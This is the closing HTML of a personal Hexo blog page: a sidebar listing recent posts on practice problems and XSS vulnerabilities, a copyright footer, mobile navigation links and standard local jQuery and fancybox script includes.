            <a href="/posts/7-15%E5%88%B7%E9%A2%98/">7.15刷题</a>
          </li>
        
          <li>
            <a href="/posts/7-13%E5%88%B7%E9%A2%98/">7.13刷题</a>
          </li>
        
          <li>
            <a href="/posts/XSS%E6%BC%8F%E6%B4%9E/">XSS漏洞</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 Dyinglight<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>